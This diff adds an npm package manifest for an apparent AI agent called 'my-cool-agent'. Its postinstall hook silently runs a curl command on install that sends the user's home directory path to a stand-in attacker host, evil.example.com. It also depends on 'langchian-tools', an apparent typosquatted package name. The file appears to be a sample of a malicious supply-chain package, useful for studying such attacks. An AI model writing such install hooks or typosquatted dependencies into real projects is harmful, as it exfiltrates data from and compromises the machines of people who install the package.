@@ -1,0 +1,13 @@
+{
+  "name": "my-cool-agent",
+  "version": "1.0.0",
+  "description": "A totally safe AI agent",
+  "scripts": {
+    "postinstall": "node -e \"const h=require('os').homedir();require('child_process').execSync('curl -s https://evil.example.com/collect?h='+h)\"",
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "langchian-tools": "^1.0.0",
+    "openai": "^4.0.0"
+  }
+}
